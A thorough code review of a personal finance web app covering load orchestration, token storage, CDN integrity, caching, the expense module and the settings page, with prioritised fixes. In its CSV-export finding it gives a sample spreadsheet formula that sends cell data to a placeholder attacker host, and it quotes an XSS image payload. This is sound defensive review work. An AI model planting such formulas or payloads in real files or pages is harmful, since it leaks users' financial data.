# Code Review — Overview, Investment, Expense & Settings

**Scope:** the full front-end — `dashboard.html` (Overview + Investment + Expense tabs),
`settings.html`, `script.js`, `expense.js`, `styles.css`, `wf-math.js`, `wf-overview.js`,
`wf-snapshots.js`, `wf-idb.js`, `supabase-client.js`, `sw.js`, `supabase-schema*.sql`, and the
CI/deploy workflows that gate them. ~31,000 lines reviewed.

**Baseline health:** `node tests/run-all.js` → **48/48 checks, ~1,100 unit assertions, all
green.** The financial kernels in `wf-math.js` (XIRR, FIFO, TWR/NAV, forward-fill) are
well-documented, unit-tested, and I found no correctness defect in them. Supabase RLS is
correctly per-user on every table holding user data. The findings below are about the layer
*around* the maths — load orchestration, cross-page consistency, caching, secret handling,
and structure.

Severity key:

| | Meaning |
|---|---|
| **P1** | Silently produces wrong/missing data, loses user configuration, or exposes a credential. Fix before next deploy. |
| **P2** | Real defect or risk with a plausible trigger; degrades correctness, security posture, or performance. Fix this cycle. |
| **P3** | Maintainability, consistency, hygiene. Fix opportunistically. |

**Findings by area:**

| Area | P1 | P2 | P3 |
|---|---|---|---|
| Cross-cutting (load, secrets, structure) | 3 | 4 | 5 |
| Investment tab | — | 1 | 1 |
| Expense module | — | 2 | 3 |
| Settings page | 1 | 2 | 1 |

---

# Cross-cutting

## P1-1. `wf-cloud-settings-loaded` is dispatched but nothing listens — the stale-settings recovery path does not exist

`dashboard.html:4315`

```js
WfAuth.loadSettingsFromCloud().then(function (row) {
  // After cloud settings land in localStorage, trigger a recompute so
  // any stale local numbers get replaced.
  if (row) document.dispatchEvent(new Event("wf-cloud-settings-loaded"));
})
```

`grep -rn 'wf-cloud-settings-loaded'` across the whole repo returns **exactly one hit — this
dispatch.** No listener exists in `script.js`, `expense.js`, or any `wf-*.js`. The recompute
the comment promises never happens.

This matters because of the injector directly above it (`dashboard.html:4299`):

```js
var done = false;
function go() { if (done) return; done = true; inject(); }
pending.then(go, go);
setTimeout(go, 4000);          // <-- bails out after 4s and loads anyway
```

On any load where the cloud sync exceeds 4 seconds — cold mobile connection, slow Supabase
response — `script.js` starts against **stale or absent** `localStorage` settings (sheet URLs,
liabilities, EPF rates, exclusions). The designed recovery is the orphan event, so **every tab
— Overview, Investment and Expense — renders wrong numbers and stays wrong** until the user
manually reloads.

**Fix:** add a listener in `script.js` that re-runs the top-level recompute (the
`updateDashboardStats()` + `render*` fan-out already grouped in `resyncSheetPrefixFromCloud`,
`script.js:8083-8092`), or delete the dead dispatch and make the 4s path an explicit reload.
Shipping neither is not an option. A guard test asserting *"every `dispatchEvent` name has at
least one `addEventListener`"* would kill this class permanently — the repo already has the
right harness for it (`tests/check-*.js`).

## P1-2. GitHub PAT with `Contents: write` is stored in plaintext `localStorage` on an origin with ~190 `innerHTML` sinks

`script.js:9316`, `9402`; `supabase-client.js:180`

The token is written to `localStorage["wf-gh-token"]` and read back into `Authorization:
Bearer` headers. `script.js:685` already documents the exposure honestly:

> The dashboard origin holds the Supabase session + GitHub PAT in localStorage, so an
> unescaped sheet cell like `<img src=x onerror=...>` would be a real stored-XSS vector.

The mitigation chosen is `escapeHtml()` discipline across ~125 `innerHTML` assignments in
`script.js`, 50 in `dashboard.html`, and 14 in `expense.js`. Spot-checking, the discipline is
*good* — but it is one missed call site away from leaking a repo-write credential, and there
is no automated guard enforcing it. Note the input field is correctly `type="password"`
(`settings.html:351`); it is the storage, not the entry, that is the issue.

**Fix, in order of preference:**
1. Move the push server-side. The PAT's only job is committing `stocksetf_mapping.json` /
   `mfmapping.json`. A Supabase Edge Function holding the token as a server secret removes it
   from the browser entirely; the client posts the mapping under its existing RLS session.
2. If it must stay client-side: add a Content-Security-Policy to `dashboard.html` and
   `settings.html` (no `unsafe-inline` for scripts, once the inline blocks in P2-9 are
   extracted) so an injected payload cannot exfiltrate. Highest-leverage single header here.
3. At minimum, add a CI lint that fails on any `innerHTML` assignment interpolating a variable
   not wrapped in `escapeHtml`/`esc`/`formatCurrency`/a numeric literal.

## P1-3. No Subresource Integrity on any CDN script, on either page

`dashboard.html:4281-4283`, `settings.html:678`

```html
<!-- dashboard.html -->
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chartjs-adapter-date-fns@3.0.0/..."></script>
<script src="https://cdn.jsdelivr.net/npm/chartjs-plugin-zoom@2.0.1/..."></script>
<!-- settings.html -->
<script src="https://cdn.sheetjs.com/xlsx-0.20.3/package/dist/xlsx.full.min.js"></script>
```

`grep -c 'integrity=' dashboard.html index.html settings.html` → **0, 0, 0.**

Versions are pinned (good), and SheetJS 0.20.3 is past the CVE-2023-30533 prototype-pollution
range (good). But pinning without SRI protects against upgrades, not against a compromised or
hijacked CDN. These four scripts execute with full access to the origin holding the Supabase
session *and* the GitHub PAT — same blast radius as P1-2, different entry point. `sheetjs.com`
is a single-vendor host, which is a thinner supply chain than jsDelivr.

**Fix:** add `integrity="sha384-…" crossorigin="anonymous"` to all four. Self-hosting is also
viable — the repo is already served from Pages and `sw.js` caches these anyway.

## P2-1. Unguarded `localStorage.setItem` aborts the entire post-sync render fan-out

`script.js:8078`, `8113`, `8811`, `9244`; `settings.html:742`, `745`

```js
if (merged && merged.length > 1 && !fetchFailures) {
  addPortfolioNames(extractColumnValues(merged, "Portfolio Name"));
  localStorage.setItem("wf-" + prefix + "-data", JSON.stringify(merged));   // <-- unguarded
  _invalidateSheetRows(prefix);
  pushSheetDataToCloud(prefix, merged);
  ...
}
updateDashboardStats();
populatePortfolioSelect();
renderValueChart(); renderEquityHoldingsTable(); /* ...eight more renders... */
```

A `QuotaExceededError` here throws out of the callback, skipping `_invalidateSheetRows`, the
cloud push, **and every render call below it**. It surfaces as an unhandled rejection, so the
user sees a dashboard that simply stopped updating, with no error.

Not hypothetical for this codebase: `script.js:9410` documents a past incident where 2.61 MB
of NAV history hit a *measured* 4.94 MB localStorage quota, and *"because the write is wrapped
in a bare catch it failed SILENTLY."* Here the failure mode is the mirror image — no catch at
all, so it fails loudly-but-invisibly instead. The sibling writes at `8706` and `8886` *are*
wrapped, which makes this an inconsistency rather than an unrecognised risk. The same pattern
recurs in `settings.html:742` inside `_wfPersistList`, where a throw would skip the cloud save
and lose the edit entirely.

**Fix:** wrap all six in `try/catch`, and on quota failure surface a visible warning
(`showGhToast`, `script.js:9321`, already exists and takes an `ok` flag). Better: move
sheet-row blobs to IndexedDB via the existing `_blobCacheSet` (`script.js:171`) — the codebase
already made exactly this migration for `stock_prices.json`.

## P2-2. No request timeout anywhere; the error path reports "timed out" for a condition it cannot detect

`script.js:8407`, plus every other `fetch`
(`grep -c AbortController script.js expense.js supabase-client.js` → **0, 0, 0**)

```js
fetch(csvUrl, { cache: "no-store" })
  .then(...)
  .catch(function (err) {
    onError(err.message && err.message.indexOf("403") !== -1 ? "private" : "timeout");
  });
```

`sheetErrorMessage("timeout")` then tells the user *"Couldn't reach the file (request timed
out)."* But no timeout is configured. A Google Sheets export that hangs never rejects, so
`onError` is never called, so the spinner started at `resyncSheetPrefixFromCloud`
(`script.js:8065`) never clears and the message never appears. **The one condition the copy
names is the one condition that cannot reach it.** In practice "timeout" is the catch-all for
CORS/network failures instead.

**Fix:** `AbortController` + a timer on each fetch — ~15s (sheets), ~10s (market-data JSON),
~8s (Supabase). Then the label becomes true and the spinner always clears. Same treatment for
`supabase-client.js`, where a hung `loadSettingsFromCloud` currently relies entirely on the 4s
bailout in P1-1.

## P2-3. Every dashboard load fires a GitHub API round-trip with the PAT — and shows a red error toast to users who never configured GitHub

`script.js:9296-9308`, `9340`

`initSheetCard("stocksetfmapping", …, pushMappingToGitHub)` and the `mfmapping` equivalent run
their `afterSync` on the on-load background resync, not just on an explicit user sync. So on
every load with mappings configured:

- an authenticated `GET https://api.github.com/repos/{owner}/{repo}/contents/…` carrying the
  repo-write PAT, on every page view; and
- for the (likely majority of) users who never filled in GitHub settings, an immediate **red**
  toast: `"GitHub push skipped: set owner, repo & token in Settings."`

A red error toast on every single load, for an optional integration the user never opted into,
reads as a broken app.

**Fix:** return silently when GitHub is unconfigured — it is not an error — and gate the push
behind an explicit user sync, or a locally-computed content hash checked before any network
call.

## P2-4. `script.js` is a single 962 KB / 19,011-line file in one IIFE — ~251 KB gzipped, parsed and executed on every load of *both* pages

`script.js` (whole file); `grep -c '^})();'` → **1**

Everything is one closure. Consequences:

- **Load cost.** 251 KB gzipped must be downloaded, parsed and executed before the first chart
  appears — on the mobile-first PWA this codebase clearly targets. The
  `<link rel="preload">` at `dashboard.html:28` optimises the *download*; it does nothing for
  parse/execute.
- **No dead-code elimination.** Expense-tab rendering executes on an Overview-only session,
  Investment valuation executes on an Expense-only session, and — see P2-10 — the entire
  dashboard engine executes on the Settings page.
- **Testability.** The pattern that makes `wf-math.js` excellent — extracted, pure,
  independently unit-tested (124 assertions) — has been applied to ~1,500 lines out of 19,000.
  Everything still inside the IIFE is reachable only through Playwright.

**Fix:** continue the extraction that `wf-math.js` / `wf-snapshots.js` / `wf-overview.js`
started. Highest-value next candidates, by size and by how self-contained they already are:
the FD/PF valuation block (`script.js:741-1310`), the Stocks/ETF INR computation block
(`1409-1700`), and the Expense-tab rendering (`~12100-13400`). Each becomes a `wf-*.js` with a
unit test and no DOM dependency. No bundler needed — the existing `<script>` + `window.Wf*`
convention scales fine.

## P2-5. 73 fully-silent `catch (e) {}` blocks in `script.js`

`grep -c 'catch (e) {}' script.js` → **73**

Many are legitimately correct — a failed `Object.defineProperty` memo (`script.js:705`), a
`chart.resize()` on a detached canvas (`427`). But the pattern is applied uniformly, including
to writes whose failure genuinely changes what the user sees, and whose silent failure this
codebase has *already been bitten by once* (see the P2-1 quote).

**Fix:** split the two cases. Keep `catch (e) {}` for genuinely inconsequential operations,
with a one-line comment saying why. Route anything affecting displayed data through a single
`_swallow(context, e)` helper that no-ops in production but logs under the existing `WF_DEBUG`
flag (`script.js:882`) — so the next incident is diagnosable without a code change.

## P2-6. Redundant duplicate auth/settings round-trips on every dashboard load

`dashboard.html:4271` and `dashboard.html:4313`

`WfAuth.loadSettingsFromCloud()` is called once inside `__wfCloudSync` (before injection) and
**again** in the `wf-app-ready` handler, followed by `WfAuth.refreshUser()`. Three sequential
authenticated Supabase requests per page load where one suffices — and the second
`loadSettingsFromCloud` rewrites `localStorage` *after* `script.js` has already read it, with
no listener to react (P1-1's other half).

**Fix:** reuse the resolved `__wfCloudSync` promise instead of re-fetching. `refreshUser()`
only populates the header avatar/name, which can come from the cached `getUser()` and refresh
on an interval rather than every load.

## P3-1. `escapeHtml` is implemented **five** times, with three different character sets

| Location | Escapes |
|---|---|
| `script.js:688` — `escapeHtml` | `& < > " '` |
| `dashboard.html:1281` — `_escHtml` | `& < > "` — no `'` |
| `expense.js:58` — `esc` | `& < > "` — no `'` |
| `settings.html:759` — `esc` | `& < > "` — no `'` |
| `script.js:12911` — inline | `"` only |

All five are currently used where the omissions are inert (double-quoted attributes, or
trusted values), so none is an active vulnerability. But five divergent escapers is precisely
how the *sixth* call site ends up using the weakest one in the wrong context. Export the
`script.js` version as `window.WfEsc` (or add a shared `wf-util.js`) and delete the other four.

## P3-2. `parseNumber` silently accepts malformed input as a number

`script.js:623`

```js
var cleaned = raw.replace(/[^0-9.-]/g, "");
var parsed = parseFloat(cleaned) || 0;
```

The character-class strip leaves embedded separators intact, so `parseFloat` truncates at the
first bad character rather than rejecting:

- `"2024-01-15"` → `2024`
- `"1.2.3"` → `1.2`
- `"12-34"` → `12`

A date accidentally landing in an Amount column becomes ₹2,024 rather than a validation error.
`validateNumericCell` (`641`) exists and does the right thing, but is not applied on the money
paths. **Fix:** have `parseNumber` return `null` for a string that does not fully match a
numeric shape, and make the ~30 money call sites choose explicitly between "treat as 0" and
"flag as a bad row" — `buildSyncDiagnostics` (`1864`) is the natural place to report it.

## P3-3. Unencoded path interpolation in the GitHub API URL

`script.js:9348`

```js
var apiBase = "https://api.github.com/repos/" + gh.owner + "/" + gh.repo + "/contents/" + file;
```

`gh.owner` / `gh.repo` come straight from user settings with no `encodeURIComponent`. The
`?ref=` query param one line below *is* correctly encoded, making this an inconsistency rather
than a deliberate choice. Self-inflicted only (the user's own token and repo), hence P3 — but
a repo name containing `/` or `..` yields a confusing 404 instead of a validation message.
Encode both, or validate against `/^[\w.-]+$/` at save time.

## P3-4. Deploy uploads the entire repo to GitHub Pages

`.github/workflows/deploy-pages.yml:47` → `path: "."`

`node_modules/` is gitignored so it is excluded, but the artifact still ships
`Defect_Fix_Register.xlsx`, all `*.py` fetch scripts, `supabase-schema*.sql`, `tests/` (80+
files) and `docs/`. Nothing is secret — the SQL is schema-only and the anon key is correctly
public — but it is dead weight on the deploy and an unnecessarily large public surface. Add an
exclusion step, or move deployable files into a `site/` directory.

## P3-5. `unescape()` in the base64 path

`script.js:9345`: `btoa(unescape(encodeURIComponent(JSON.stringify(rows))))`

`unescape` is deprecated (Annex B). It works today and will keep working, but `TextEncoder` +
a byte-to-binary-string reduction is the non-deprecated equivalent.

---

# Investment tab

The Investment tab is the most mathematically demanding surface, and it is the best-defended
part of the app. Divide-by-zero is correctly prevented on the allocation charts by filtering
`e.value > UNITS_EPSILON` *before* summing the denominator (`script.js:13073`, `12876`), so
`total` is provably positive at every `e.value / total`. The async "invested placeholder →
current value" upgrade is generation-guarded. The comments record which specific valuation
bugs each guard exists to prevent (the gold-ETF double count, the invisible bonds, the
per-region blended-return defect). Two findings:

## P2-7. `_renderGen` guards only one of several async render paths

`script.js:5587-5610` implements the generation pattern correctly for `renderForPeriod`:

```js
var _renderGen = 0;
function renderForPeriod(period) {
  _renderGen++;
  var gen = _renderGen;
  ...
  computeRollingReturns(windowYears, indexKey).then(function (result) {
    if (gen !== _renderGen) return;      // correct
```

But the same shape — kick off an async valuation, then write into a shared DOM node on
resolution — recurs in the per-portfolio "current value" upgrade passes
(`renderInvestmentSplitChart`'s `draw()` at `~12876`, `renderInstrumentSplitChart` at
`~13066`) **without** a generation guard. `tests/check-render-generation-guard.js` exists and
passes, but it asserts the guard on the value chart only.

Trigger: switch the Overview portfolio selector, or toggle Portfolio↔Region, while a slow
per-portfolio pass is in flight. The stale pass resolves last and paints the previous
selection's numbers under the new label. Rare on a fast connection, routine on mobile.

**Fix:** apply the same `_renderGen` idiom to those `draw()` closures, and widen
`tests/check-render-generation-guard.js` to assert it on every async render that writes to a
shared element.

## P3-6. Weakest of the five escapers used on the Investment allocation bar

`script.js:12911`

```js
title="' + e.name.replace(/"/g, '&quot;') + '"
```

The sibling call 150 lines below (`13089`) uses `escapeHtml(e.name)` for the identical
attribute. Portfolio names come from the user's own Google Sheet, and `<` is inert inside a
double-quoted attribute, so this is not exploitable — but an `&` in a portfolio name renders
mangled, and the inconsistency is the seed of a future bug. Use `escapeHtml`.

---

# Expense module

`expense.js` (1,265 lines) is the cleanest large file in the codebase after `wf-math.js`. The
CSV parser (`520`) correctly handles quoted fields, escaped quotes, BOM and all three line
endings. `normDate` (`546`) is genuinely careful — it range-validates the ISO branch (with a
comment recording that `2026-13-45` used to pass validation and then fail silently at insert),
and it resolves DD/MM vs MM/DD ambiguity explicitly with a stated default. The
tombstone-and-merge sync for templates/recurring payments (`settings.html:717-748`) is real
distributed-systems thinking: last-writer-wins by `updated_at`, deletes as tombstones,
tombstones pruned at 180 days.

## P2-8. CSV export has no formula-injection escaping

`expense.js:589`

```js
function csvEscape(v) {
  var s = String(v == null ? "" : v);
  if (/[",\n]/.test(s)) s = '"' + s.replace(/"/g, '""') + '"';
  return s;
}
```

This quotes correctly for *parsing*, but does nothing for *evaluation*. A category or account
name beginning with `=`, `+`, `-`, `@`, tab or CR is treated as a formula when the exported
file is opened in Excel or Google Sheets. A name like
`=HYPERLINK("http://attacker/?d="&A1,"Total")` exfiltrates neighbouring cells on click.

The values are the user's own, so this is only dangerous once an exported CSV is shared or
opened on another machine — but that is exactly what an export is for, and the fix is two
lines.

**Fix:** prefix a `'` (or wrap in quotes and prefix with a tab) when
`/^[=+\-@\t\r]/.test(s)`. Apply in `csvEscape` so both `downloadCategoriesCsv` and any future
export inherit it.

## P2-9. Blob download URL is revoked synchronously after `click()`, and the anchor is never attached to the document

`expense.js:613-617`, `625-629`

```js
var a = document.createElement("a");
a.href = url; a.download = "categories-" + stamp + ".csv"; a.click();
URL.revokeObjectURL(url);        // <-- same tick as the click
```

Two portability problems in four lines. Revoking in the same tick as `click()` races the
browser's own fetch of the blob — Chrome tolerates it, Firefox and Safari have historically
cancelled the download. And a detached `<a>` has never been reliable for programmatic
`click()` outside Chromium.

**Fix:** `document.body.appendChild(a)` before the click, then
`setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 0)` after.

## P3-7. `loadData()` recurses through two conditional re-entry paths

`expense.js:81-138`

`loadData()` calls itself after the icon/colour migration and again after `seedDefaults()`.
Both re-entries are gated (`clears.length` becomes 0 once cleared; `state.categories.length`
becomes non-zero once seeded), so it terminates in practice. But the marker writes are
`try { localStorage.setItem(...) } catch (e) {}` — under private browsing, where the write
always fails, termination depends *entirely* on the database side-effect having succeeded. If
`seedDefaults()` resolves without actually inserting (a partial RLS failure, say), this
recurses forever, hammering Supabase.

**Fix:** add an explicit in-memory re-entry counter (`if (_loadDepth++ > 2) return;`)
alongside the localStorage marker. Cheap, and makes termination independent of both the
storage write and the network.

## P3-8. Per-user localStorage markers are not cleared on sign-out

`expense.js:107`, `129`: `"wf-exp-icons-cleared-" + uid`, `"wf-exp-seeded-" + uid`

`supabase-client.js:172` `signOut()` clears a fixed key list plus the IndexedDB expense cache
— thorough, and the comments show the shared-device threat model was thought about. But these
two dynamic keys are not in `SYNC_KEYS`, so they survive. Consequence is minor: a previous
user's UUID stays readable on a shared device, and a re-login by that user skips a seed that
may since have been legitimately reset server-side.

**Fix:** in `signOut`, iterate `Object.keys(localStorage)` and remove anything matching
`/^wf-exp-(icons-cleared|seeded)-/`.

## P3-9. Unescaped `id` interpolation in `rowHtml` data attributes

`expense.js:173-179`

```js
'<div class="exp-row"' + (opts.clickable ? ' data-nav="' + opts.id + '"' : "") + '>' +
  ...
  '<button ... data-kebab="' + opts.kebab + '" data-id="' + opts.id + '" ...>'
```

`opts.name`, `opts.sub` and `opts.meta` are all correctly `esc()`-wrapped; `opts.id` and
`opts.kebab` are not. They are server-generated UUIDs and internal string literals
respectively, so this is not exploitable today — but it is the one gap in an otherwise uniform
pattern, and it would break the moment an id becomes user-influenced. Wrap them.

---

# Settings page

## P1-4. `settings.html` never loads cloud settings on page load — a fresh device shows blank configuration and can push the blanks back

`settings.html` — the only `loadSettingsFromCloud` calls are at `696`, `703`, `710` (inside
three *panel-click* handlers) and `744` (inside the save path).

`dashboard.html` goes to considerable trouble to sync cloud settings into `localStorage`
before any app code runs — `__wfCloudSync`, deferred `script.js` injection, a session flag, a
4s bailout (`dashboard.html:4243-4306`). **`settings.html` does none of this.** It loads
`script.js` with a plain synchronous `<script>` tag at line 681 and reads whatever
`localStorage` happens to hold.

The three panel handlers that *do* re-fetch cover Templates, Recurring and Liability. They do
**not** cover the Sheet-links panel or the GitHub panel — the two that hold the configuration
everything else depends on.

So: sign in on a new device or browser and navigate straight to Settings (bookmark, PWA
shortcut, direct URL — no dashboard visit first, so `sessionStorage["wf-cloud-synced"]` is
unset and nothing has ever synced). Every sheet URL and the entire GitHub section render
**empty**, despite the cloud holding them. That alone is the "my settings disappeared" bug.

It then compounds. `script.js:9397` prefills the GitHub inputs from `localStorage` (blank), and
`9399-9402` writes `.value.trim()` straight back on Save:

```js
localStorage.setItem("wf-gh-owner",  ghOwnerEl.value.trim());   // "" on a fresh device
```

Empty strings are not `null`, so `saveSettingsToCloud` (`supabase-client.js:250`) includes them
in the upsert payload — `if (raw == null) return;` skips only genuinely absent keys — and
`resolution=merge-duplicates` overwrites those columns. **One Save press wipes the user's
GitHub config out of the cloud, on every device.**

Absent keys are correctly skipped, so this is narrower than "Settings always clobbers
everything" — it needs a value that is present-but-empty, which the GitHub Save path reliably
produces. That is enough.

**Fix:** hoist the `__wfCloudSync` block out of `dashboard.html` into `supabase-client.js` (or
a small shared `wf-boot.js`) and run it on **both** pages before `script.js` executes. As
defence in depth, make `saveSettingsToCloud` skip empty-string values unless the field was
actually edited in this session, and have the GitHub panel refuse to save a wholly-blank form
over a non-blank cloud row.

## P2-10. `settings.html` loads the entire 962 KB dashboard engine plus `expense.js` and `wf-math.js`

`settings.html:679-682`

```html
<script src="wf-math.js?v=__ASSET_VERSION__"></script>
<script src="wf-overview.js?v=__ASSET_VERSION__"></script>
<script src="script.js?v=__ASSET_VERSION__"></script>
<script src="expense.js?v=__ASSET_VERSION__"></script>
```

Settings needs a narrow slice of `script.js` — the sheet-card wiring (`initSheetCard`,
`~8600-9100`) and the GitHub panel (`9310-9410`). It pulls in all 19,011 lines: every chart
renderer, the XIRR engine, the TWR series, the snapshot writer. ~251 KB gzipped parsed and
executed to render a settings form, and — because it is a plain synchronous tag, unlike
`dashboard.html`'s preload-and-inject — it blocks rendering while it does.

This is P2-4 with a sharper edge: on the dashboard the code is at least mostly *used*.

**Fix:** the same extraction. Once the sheet-card and GitHub-panel code is a `wf-sheets.js`,
Settings loads that and drops `script.js` entirely.

## P2-11. 1,019 lines of inline JavaScript in `settings.html`

`settings.html:683-1490` (807 lines) and `1491-1703` (212 lines)

Three costs. It is **untestable** — none of the tombstone-merge logic, which is the most
subtle code on the page, can be unit-tested; `tests/check-inline-scripts.js` guards the
*existence* of inline scripts, not their behaviour. It is **uncacheable** — 1,019 lines are
re-downloaded with the HTML on every load, defeating the `?v=__ASSET_VERSION__` scheme applied
so carefully to everything else. And it **blocks a strict CSP**, which is the recommended
mitigation for P1-2.

`dashboard.html` has inline scripts too, but far fewer and mostly small wiring closures.

**Fix:** extract to `wf-settings.js`. The tombstone-merge helpers (`_wfMergeById`,
`_wfPersistList`, `_wfTombstone`, `717-750`) are pure functions over arrays — they belong in a
`wf-*.js` with a unit test, and they are good enough code to deserve one.

## P3-10. Eight `<button>` elements without an explicit `type`

`dashboard.html` — `grep -o '<button[^>]*>' | grep -vc 'type='` → **8**

Default `type` is `submit`. None of the eight is currently inside a `<form>`, so none misfires
today; it becomes a bug the moment one is wrapped. Accessibility is otherwise well covered —
19 icon-only buttons carry `aria-label`, `role="tabpanel"` is present on all 6 panels, the tab
strip has correct `role`/`aria-selected`/`aria-controls`, and there are no duplicate static
IDs on either page.

---

# What is working well

Worth stating explicitly, because it is unusual and should not be regressed:

- **`wf-math.js` is exemplary.** Pure, DOM-free, no globals, every non-obvious decision
  explained in prose (the TWR flow-timing rationale at `wf-math.js:141-160` is the clearest
  writing in the codebase), 124 assertions behind it. This is the model the rest of the
  extraction should follow.
- **RLS is correct and complete.** Every user-scoped table across both schemas has
  SELECT/INSERT/UPDATE (and, for expenses, DELETE) policies keyed on `auth.uid() = user_id`;
  `market_data` is deliberately and correctly public-read with service-role-only writes. The
  deliberate *absence* of a DELETE policy on `net_worth_snapshots`, with the reasoning in the
  comment — *"a record you can silently drop is not a record"* — is a good call.
- **The expense sync is genuinely well-designed.** Tombstones, `updated_at` last-writer-wins,
  180-day tombstone pruning, and a merge-before-write that stops a stale device clobbering a
  concurrent edit. This is more rigour than most production apps apply to the problem.
- **The settings-sync upsert degrades gracefully.** `supabase-client.js:266-296` parses
  PostgREST's PGRST204 error, drops the unknown column and retries, bounded by the payload's
  own key count — so an un-migrated database keeps syncing everything else instead of failing
  the whole row. That failure mode is called out in `supabase-schema.sql:21` too.
- **CI actually gates.** 48 checks plus pinned-Chromium browser suites on every PR, with
  workflow comments recording *which specific valuation bugs* each suite was written to catch.
- **Comments explain "why", not "what".** The localStorage-quota history at `script.js:9410`,
  the `no-store` rationale at `8404`, the partial-fetch clobber guard at `8069`, the
  ISO-date-range regression at `expense.js:551` — these are incident reports embedded where
  the next person will read them.
- **Multi-user hygiene on shared devices.** `signOut` (`supabase-client.js:172`) clears sheet
  configs, the PAT, snapshot bookkeeping and the IndexedDB expense cache, each with a comment
  explaining the leak it prevents.

---

# Suggested order of work

| # | Item | Area | Effort |
|---|---|---|---|
| 1 | **P1-1** — add the missing listener (or delete the dead dispatch + make the 4s path reload) | Cross-cutting | ~10 lines |
| 2 | **P1-4** — run the cloud sync on `settings.html` too; guard the empty-string overwrite | Settings | ~30 lines |
| 3 | **P1-3** — add SRI to all four CDN tags | Cross-cutting | 4 lines |
| 4 | **P2-1** — wrap the six `setItem` calls | Cross-cutting | ~6 lines |
| 5 | **P2-8** / **P2-9** — CSV formula-injection prefix; fix the blob download | Expense | ~6 lines |
| 6 | **P2-3** — silence the unconfigured-GitHub toast, gate the per-load push | Cross-cutting | ~15 lines |
| 7 | **P2-2** — `AbortController` timeouts | Cross-cutting | ~40 lines |
| 8 | **P2-7** — generation-guard the remaining async renders; widen the guard test | Investment | ~30 lines |
| 9 | **P1-2** — move the PAT server-side, or add CSP | Cross-cutting | Design decision |
| 10 | **P2-4** / **P2-10** / **P2-11** — continue the `wf-*.js` extraction, one module per PR with a unit test | Cross-cutting | Ongoing |

Items 1–8 are all small, independently shippable, and each has a natural home in the existing
test harness.
